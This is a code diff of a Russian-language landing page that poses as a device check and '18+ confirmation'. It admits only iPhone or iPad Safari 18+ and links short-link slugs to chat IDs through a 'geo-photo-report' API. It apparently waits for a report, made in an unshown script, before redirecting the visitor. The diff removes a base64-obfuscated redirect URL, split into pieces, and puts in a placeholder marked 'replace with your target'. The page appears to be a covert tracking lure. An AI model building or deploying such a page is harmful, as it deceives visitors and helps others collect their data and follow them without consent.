@@ -8,17 +8,18 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="default">
   <meta name="format-detection" content="telephone=no">
 
-  <!-- ✅ Даем фронту адрес API на Render -->
+  <!-- ✅ Адрес API на Render -->
   <script>
     window.__API_BASE = 'https://geo-photo-report.onrender.com';
   </script>
 
+  <!-- ✅ SPA fallback для /r/<slug> -->
   <script>
-    // === SPA fallback для /r/<slug> ===
     (function(){
       const m = location.pathname.match(/^\/r\/([a-z0-9\-]{3,40})$/i);
       if (m) {
         const slug = m[1];
+        window.__SLUG = slug; // <– сохраняем slug глобально
         const newUrl = '/index.html?slug=' + encodeURIComponent(slug);
         history.replaceState(null, '', newUrl);
         location.reload();
@@ -27,61 +28,46 @@
   </script>
 
   <style>
-    :root{
+    :root {
       --bg0:#ffffff;--bg1:#f7f9ff;
       --txt:#111;--sub:#444;--muted:#6b7280;
-      --primary:#2563eb;--primary2:#60a5fa;--err:#ef4444;--ok:#16a34a;
-      --radius:20px;--shadow:0 6px 30px rgba(0,0,0,.08);--ring:0 0 0 3px rgba(37,99,235,.25)
+      --primary:#2563eb;--primary2:#60a5fa;
+      --err:#ef4444;--ok:#16a34a;
+      --radius:20px;--shadow:0 6px 30px rgba(0,0,0,.08);
+      --ring:0 0 0 3px rgba(37,99,235,.25)
     }
     html,body{height:100%}
-    html{color-scheme:light}
     body{
-      margin:0;overflow:hidden;position:relative;color:var(--txt);
+      margin:0;overflow:hidden;display:grid;place-items:center;
       font-family:"Segoe UI",Roboto,system-ui,-apple-system,sans-serif;
-      display:grid;place-items:center;background:var(--bg0);
-      -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale
+      background:var(--bg0);color:var(--txt);
+      -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
     }
-    .animated-gradient{
-      position:absolute;inset:-12vmax;z-index:0;pointer-events:none;
+    .animated-gradient{position:absolute;inset:-12vmax;z-index:0;pointer-events:none;
       filter:blur(80px) saturate(110%);opacity:.35;
       background:conic-gradient(from 0deg,rgba(96,165,250,.20),rgba(14,165,233,.15),rgba(199,210,254,.18),rgba(96,165,250,.20));
-      animation:swirl 32s linear infinite
-    }
+      animation:swirl 32s linear infinite}
     @keyframes swirl{to{transform:rotate(360deg)}}
-    @media (prefers-reduced-motion: reduce){.animated-gradient{animation:none}}
-    canvas#bg{position:absolute;inset:0;z-index:0;pointer-events:none}
-    body::before{
-      content:"vskoll";position:absolute;inset:0;display:grid;place-items:center;z-index:0;
-      font-size:14vw;font-weight:800;letter-spacing:.18em;text-transform:uppercase;color:rgba(0,0,0,.015);
-      filter:blur(1.2px);user-select:none;pointer-events:none;transform:rotate(-10deg)
-    }
-    .card{
-      width:min(92vw,520px);padding:28px;border-radius:var(--radius);
-      background:rgba(255,255,255,.92);-webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px);
-      box-shadow:var(--shadow);border:1px solid rgba(17,24,39,.06);text-align:center;position:relative;z-index:2
-    }
-    h1{font-size:24px;font-weight:800;margin:0 0 12px;color:var(--txt)}
-    p{font-size:16px;color:var(--sub);margin:0 0 18px;line-height:1.55}
-    .reason{font-size:13px;margin-top:8px;color:var(--muted);min-height:1.6em}
+    .card{width:min(92vw,520px);padding:28px;border-radius:var(--radius);
+      background:rgba(255,255,255,.92);backdrop-filter:blur(6px);
+      box-shadow:var(--shadow);text-align:center;z-index:2}
+    h1{font-size:24px;font-weight:800;margin:0 0 12px}
+    p{font-size:16px;margin:0 0 18px;line-height:1.55}
+    .reason{font-size:13px;margin-top:8px;color:var(--muted)}
     .notice{font-size:12px;color:var(--muted);margin-top:14px}
     button{
       width:100%;height:54px;border:none;border-radius:14px;
       background:linear-gradient(90deg,var(--primary),var(--primary2));
-      color:#fff;font-weight:800;font-size:16px;letter-spacing:.5px;cursor:pointer;
-      transition:transform .12s ease,box-shadow .12s ease,filter .12s ease;
+      color:#fff;font-weight:800;font-size:16px;cursor:pointer;
+      transition:transform .12s ease,box-shadow .12s ease;
       box-shadow:0 10px 25px rgba(37,99,235,.25)
     }
-    button:hover{transform:translateY(-1px) scale(1.01);box-shadow:0 14px 30px rgba(37,99,235,.32)}
-    button:active{transform:scale(.98);box-shadow:0 8px 18px rgba(37,99,235,.40)}
-    button:focus-visible{outline:none;box-shadow:var(--ring)}
     .ok{color:var(--ok);font-weight:700}
     .err{color:var(--err);font-weight:700}
   </style>
 </head>
 <body>
-  <div class="animated-gradient" aria-hidden="true"></div>
-  <canvas id="bg" aria-hidden="true"></canvas>
-
+  <div class="animated-gradient"></div>
   <div class="card" id="card">
     <h1 id="title">Проверка устройства</h1>
     <p id="text">Определение платформы…</p>
@@ -90,150 +76,79 @@
     <div class="notice" id="note"></div>
   </div>
 
-  <!-- ✅ Резолв slug -->
+  <!-- ✅ Скрипт проверки slug и связи с API -->
   <script>
     (async function resolveSlug(){
-      if (window.__TARGET_CHAT_ID) return;
+      const API_BASE = (typeof window !== 'undefined' && window.__API_BASE)
+        ? String(window.__API_BASE).replace(/\/+$/, '')
+        : '';
 
-      const API_BASE = (typeof window !== 'undefined' && window.__API_BASE) ? String(window.__API_BASE).replace(/\/+$/, '') : '';
-
-      // ищем slug в query (?slug=...)
-      const m = location.search.match(/[?&]slug=([a-z0-9\-]{3,40})/i);
-      if (!m) return;
-      const slug = m[1];
+      const q = new URLSearchParams(location.search).get('slug');
+      const slug = q || window.__SLUG || null;
+      if (!slug) return;
       window.__TARGET_SLUG = slug;
 
       try {
-        // ⚠️ Ходим на Render по абсолютному URL
         const r = await fetch(`${API_BASE}/api/resolve-link?slug=${encodeURIComponent(slug)}`);
-        let data = null; try { data = await r.json(); } catch(_) {}
-        if (r.ok && data && data.ok && data.chatId) {
+        const data = await r.json().catch(()=>null);
+        if (r.ok && data?.ok && data.chatId) {
           window.__TARGET_CHAT_ID = String(data.chatId);
           console.log('[resolve-link] OK for slug:', slug, '→ chatId:', window.__TARGET_CHAT_ID);
         } else {
-          const msg = (data && (data.error || data.message)) || `HTTP ${r.status}`;
-          console.warn('resolve-link failed:', msg);
-          const note = document.getElementById('note');
-          if (note) note.textContent = 'Ссылка не активна или не найдена.';
+          document.getElementById('note').textContent = 'Ссылка не активна или не найдена.';
         }
       } catch (e) {
         console.error('resolve-link error:', e);
-        const note = document.getElementById('note');
-        if (note) note.textContent = 'Ошибка связи с сервером.';
+        document.getElementById('note').textContent = 'Ошибка связи с сервером.';
       }
     })();
   </script>
 
-  <!-- Твой фронтовый скрипт -->
+  <!-- Основной фронтовый код -->
   <script src="/app.js"></script>
 
-  <!-- Остальная логика страницы (визуал) -->
+  <!-- Остальная визуальная логика -->
   <script>
-    const URL_PARTS=[
-      "aHR0cHM6Ly93d3cucHViZ21vYmlsZS5jb20vaWcvaXRvcC93aGF0c2FwcC9hdXRo",
-      "P3R5cGU9d2hhdHNhcHBhdXRoJmRhdGE9ZXlKYWRYTjBJam9nS2x3SWFTVnlaVzFo",
-      "YVhwbEluMHNJbWgwZEhCek9pOHhNVFV5T1RrM05EZzBOVGt3TUNJc0ltbGhjM05s",
-      "ZEhKbGMzUWlPaUpHVjJsMGFYWmxJaXdpWm1KallYUnBiMjRpT2lJd1dsaEtWbUZK",
-      "UlVGUFZrUkpVQSJ9"
-    ];
-    function decodeUrl(parts){
-      try{
-        const b64=parts.join('');const bin=atob(b64);
-        const bytes=Uint8Array.from(bin,c=>c.charCodeAt(0));
-        return new TextDecoder().decode(bytes);
-      }catch{return '';}
-    }
-    function go(){
-      const target=decodeUrl(URL_PARTS);
-      if(target) location.assign(target);
-    }
-
-    const $ = (id)=>document.getElementById(id);
-    const title=$('title'), text=$('text'), reason=$('reason'), btn=$('enterBtn'), note=$('note');
-
-    function getIOSLikeVersion(){
-      const ua=navigator.userAgent;const m=ua.match(/OS\s(\d+)[_.]/) || (navigator.appVersion && navigator.appVersion.match(/Version\/(\d+)/));
-      return m ? parseInt(m[1],10) : null;
-    }
-    function isSafariWebKit(){
-      const ua=navigator.userAgent;
-      const vendorOK=navigator.vendor==='Apple Computer, Inc.';
-      const token=/Safari\//.test(ua) && !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua);
-      return vendorOK && token;
-    }
+    const $ = id => document.getElementById(id);
     function isIOSFamily(){
-      const ua=navigator.userAgent;
-      const touchMac=navigator.platform==='MacIntel' && navigator.maxTouchPoints>1;
+      const ua = navigator.userAgent;
+      const touchMac = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;
       return /(iPhone|iPad|iPod)/.test(ua) || touchMac;
     }
-    function isStandalonePWA(){
-      return matchMedia('(display-mode: standalone)').matches || navigator.standalone===true;
+    function isSafariWebKit(){
+      const ua = navigator.userAgent;
+      const vendorOK = navigator.vendor === 'Apple Computer, Inc.';
+      return /Safari\//.test(ua) && !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) && vendorOK;
     }
-    function trustScore(){
-      let s=0;
-      if(isSafariWebKit()) s+=2;
-      if(isIOSFamily()) s+=2;
-      if(!('userAgentData' in navigator)) s+=0.5;
-      if(isStandalonePWA()) s+=0.5;
-      return s;
+    function getIOSLikeVersion(){
+      const ua = navigator.userAgent;
+      const m = ua.match(/OS\s(\d+)[_.]/) || (navigator.appVersion && navigator.appVersion.match(/Version\/(\d+)/));
+      return m ? parseInt(m[1], 10) : null;
     }
-
-    (function particles(){
-      const reduce=matchMedia('(prefers-reduced-motion: reduce)').matches;
-      const c=document.getElementById('bg');
-      const ctx=c.getContext('2d',{alpha:true});
-      let dpr=Math.min(2,window.devicePixelRatio||1),W,H,raf,last=0;
-      const MAX=reduce?24:50,FPS=48,ps=[];
-      function resize(){W=c.clientWidth=innerWidth;H=c.clientHeight=innerHeight;c.width=Math.floor(W*dpr);c.height=Math.floor(H*dpr);ctx.setTransform(dpr,0,0,dpr,0,0)}
-      function spawn(){ps.length=0;for(let i=0;i<MAX;i++) ps.push({x:Math.random()*W,y:Math.random()*H,r:.8+Math.random()*1.8,a:Math.random()*Math.PI*2,s:.12+Math.random()*.35,o:.12+Math.random()*.25})}
-      function step(ts){
-        if(ts-last<1000/FPS){raf=requestAnimationFrame(step);return}
-        last=ts;ctx.clearRect(0,0,W,H);
-        for(const p of ps){
-          p.a+=.002+p.s*.002;p.x+=Math.cos(p.a)*p.s;p.y+=Math.sin(p.a)*p.s;
-          if(p.x<-5)p.x=W+5;else if(p.x>W+5)p.x=-5;
-          if(p.y<-5)p.y=H+5;else if(p.y>H+5)p.y=-5;
-          ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
-          ctx.fillStyle=`rgba(37,99,235,${p.o})`;ctx.fill();
-          ctx.shadowBlur=12;ctx.shadowColor='rgba(37,99,235,.22)';ctx.fill();ctx.shadowBlur=0;
-        }
-        raf=requestAnimationFrame(step);
-      }
-      function start(){ if(reduce) return; cancelAnimationFrame(raf); resize(); spawn(); raf=requestAnimationFrame(step)}
-      addEventListener('resize',()=>{dpr=Math.min(2,devicePixelRatio||1);resize()});
-      addEventListener('visibilitychange',()=>{document.hidden?cancelAnimationFrame(raf):start()});
-      start();
-    })();
 
     document.addEventListener('DOMContentLoaded', () => {
-      const ver=getIOSLikeVersion();
-      const score=trustScore();
-      const isiOS=isIOSFamily();
+      const ver = getIOSLikeVersion();
+      const isiOS = isIOSFamily();
+      const ok = isiOS && ver && ver >= 18 && isSafariWebKit();
 
-      const ok=isiOS && ver && ver>=18 && score>=3.5 && isSafariWebKit();
-      if(ok){
-        $('title').textContent='Подтверждение 18+';
-        $('text').innerHTML='<span class="ok">Доступ разрешён.</span>';
-        $('reason').textContent=`${/iPad|MacIntel/.test(navigator.platform)||/iPad/.test(navigator.userAgent)?'iPadOS':'iOS'} ${ver}, Safari WebKit.`;
-        $('enterBtn').style.display='block';
-        $('note').textContent='Кнопка активируется после проверки.';
+      if (ok) {
+        $('title').textContent = 'Подтверждение 18+';
+        $('text').innerHTML = '<span class="ok">Доступ разрешён.</span>';
+        $('reason').textContent = `iOS ${ver}, Safari WebKit.`;
+        $('enterBtn').style.display = 'block';
+        $('note').textContent = 'Кнопка активируется после проверки.';
         if (typeof window.__autoFlow === 'function') {
-          setTimeout(()=>window.__autoFlow(), 10);
+          setTimeout(() => window.__autoFlow(), 50);
         }
-        $('enterBtn').addEventListener('click',(e)=>{
-          if(!window.__reportReady){ e.preventDefault(); return; }
-          go();
+        $('enterBtn').addEventListener('click', e => {
+          if (!window.__reportReady) { e.preventDefault(); return; }
+          location.assign('https://example.com'); // замени на свою цель
         });
-      }else{
-        $('title').textContent='Доступ отклонён';
-        let r='';
-        if(!isiOS) r='Устройство не относится к iOS/iPadOS.';
-        else if(!ver || ver<18) r='Версия iOS/iPadOS ниже 18.';
-        else if(score<3.5 || !isSafariWebKit()) r='Обнаружена подмена User-Agent/браузер не Safari.';
-        else r='Неизвестная ошибка.';
-        $('text').innerHTML='<span class="err">Отказ в доступе.</span>';
-        $('reason').textContent='Причина: ' + r;
-        $('note').textContent='Доступ возможен только на iPhone/iPad с Safari 18+.';
+      } else {
+        $('title').textContent = 'Доступ отклонён';
+        $('text').innerHTML = '<span class="err">Отказ в доступе.</span>';
+        $('reason').textContent = 'Доступ возможен только на iPhone/iPad с Safari 18+.';
+        $('note').textContent = 'Проверьте устройство и повторите.';
       }
     });
   </script>
